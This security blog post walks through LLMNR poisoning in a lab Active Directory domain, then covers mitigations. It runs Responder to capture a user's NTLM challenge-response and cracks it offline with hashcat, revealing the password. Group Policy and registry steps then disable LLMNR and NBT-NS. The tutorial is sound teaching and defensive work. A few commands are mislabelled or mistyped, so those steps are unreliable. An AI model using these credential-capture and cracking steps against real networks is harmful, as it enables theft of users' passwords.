---
title: "LLMNR Poisoning"
date: "2026-07-01"
summary: "Demonstrating Link-Local Multicast Name Resolution (LLMNR) poisoning to intercept NTLM authentication attempts using Responder, analyze the authentication flow, and discuss detection and mitigation in an Active Directory environment."
tags:
  - active-directory
  - llmnr
  - nbt-ns
  - ntlm
  - responder
  - windows
  - credential-access
  - mitm
---


## What is LLMNR ?

**Link-Local Multicast Name Resolution (LLMNR)** is a name resolution protocol that allows both IPv4 and IPv6 hosts to resolve the names of devices on the same local network without relying on a DNS server. It operates at the **Application Layer (Layer 7)** of the OSI model and provides peer-to-peer hostname resolution within a single subnet.

When a Windows system attempts to resolve a hostname, it first queries the configured DNS server. If the DNS lookup fails because the hostname cannot be resolved, the system falls back to **LLMNR**, sending a multicast name resolution request to other hosts on the local network. Any host claiming ownership of the requested name can respond, allowing the client to continue the connection process.

A significant security concern with LLMNR is that **it does not authenticate responses**. Since there is no mechanism to verify the legitimacy of a reply, any system on the same network segment can answer an LLMNR query. An attacker can exploit this behavior by responding before the legitimate host, causing the victim to initiate authentication to the attacker's machine. In Windows environments, this typically results in the victim sending an **NTLM challenge-response**, which can be captured for credential analysis, relay attacks, or password cracking during authorized security assessments.



## Exploiting LLMNR (AKA LLMNR Poisoning) in Active Directory

LLMNR poisoning is an attack where a malicious actor listens for LLMNR requests and responds with their own IP address (or another IP of their choosing) to redirect the traffic. This can lead to credential theft and relay attacks in Active Directory. Here is a sample walkthrough.

### Step 1: The Attacker Runs Responder


```bash
sudo responder -I eth0 -dwP
```

![responder](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image1.png?raw=true)


### Step 2: Triggering LLRM


Once the attacker is listening for LLMNR requests (for example, using **Responder**), they can induce a victim to authenticate by convincing them to access a network resource hosted on the attacker's machine.

In this demonstration, the victim opens **File Explorer** and enters the attacker's IP address in the address bar:

```bash
\\<attacker-ip>
```

![response](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image2.png?raw=true)

Windows attempts to access the remote SMB share and automatically initiates **NTLM authentication**. During this process, the attacker captures the victim's NTLM challenge-response.

![response](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image4.png?raw=true)

The captured authentication includes:

- The victim's IP address (e.g., `10.0.3.7`)
- The victim's domain and username (e.g., `MARVEL\fcastle`)
- The NTLM challenge-response hash

At this point, the attacker has successfully captured the victim's NTLM challenge-response during the initial SMB authentication process.

And at the same time Windows then displays a credential prompt because the requested network resource requires authentication and the connection cannot be completed.

![victim](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image3.png?raw=true)

Regardless of whether the victim enters valid credentials, incorrect credentials, or closes the prompt, the NTLM challenge-response has already been transmitted to the attacker's system. The credential prompt occurs **after** the initial NTLM authentication exchange and does not affect the successful capture of the authentication data.


## Step 3: Cracking the Victim’s Hash

After capturing the victim's NTLM challenge-response, the attacker can perform **offline password cracking** to attempt recovery of the plaintext password.
Tools such as **Hashcat** can be used to compare the captured hash against wordlists or rule-based password candidates. 

```bash
hashcat –m 5600 <hashfile.txt> /usr/share/wordlist/rockyou.txt
```

![hashcat](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image5.png?raw=true)

The success of this process depends on factors such as password complexity, length, and the attacker's available computational resources.



![hashacat](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image6.png?raw=true)

And We have successfully cracked the victim’s password hash, which was found to be `fs@123456#`

## How Can LLMNR Poisoning Be Mitigated in Active Directory?

### Disable LLMNR and NBT-NS


To disable **LLMNR**, select **Turn OFF Multicast Name Resolution** under Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor of Active Directory.

![LLMNR](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image7.png?raw=true)

To disable **NBT-NS**, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select “Disable NetBIOS over TCP/IP” in Active Directory. This only works locally

![NBT-NS](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image8.png?raw=true)

To disable NBT-NS via GPO in Active Directory, we can simply write a PowerShell script (see below) and save it in Startup Scripts.

We can confirm that we have mitigated LLMNR by running the following command in PowerShell and receiving a ‘0’ in return:

```bash
set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\tcpip* -Name NetbiosOptions -Value 2
```

![powershell](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image9.png?raw=true)



We can confirm that we have mitigated NBT-NS by running the following command in cmd.exe and receiving a ‘2’ in return:

```bash
wmic nicconfig get caption,index,TcpipNetbiosOptions
```


![powershell](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/AD/LLMNR%20POISONING/image10.png?raw=true)

Implementing these controls significantly reduces the attack surface for LLMNR poisoning and related credential theft or NTLM relay attacks in Active Directory environments.